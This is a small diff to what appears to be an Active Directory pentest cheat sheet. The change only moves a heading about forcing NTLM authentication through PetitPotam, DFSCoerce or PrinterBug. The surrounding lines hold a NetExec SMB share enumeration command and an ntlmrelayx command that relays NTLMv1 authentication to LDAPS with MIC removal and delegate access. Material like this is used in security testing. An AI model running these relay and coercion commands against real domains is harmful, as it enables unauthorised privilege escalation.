@@ -516,10 +516,10 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   <summary> NTLMv1-relay </summary>   
 
   ### NTLMRelayx delegate access if NTLMv1 is enabled
+  #### Authentication can be forced via PetitPotam, DFSCoerce or PrinterBug, check if the answer is in NTLMv1
   ```shell
   sudo python3 ntlmrelayx.py -t ldaps://<target> --remove-mic -smb2support --delegate-access
   ```
-  #### Authentication can be forced via PetitPotam, DFSCoerce or PrinterBug, check if the answer is in NTLMv1
 
 </details>
 
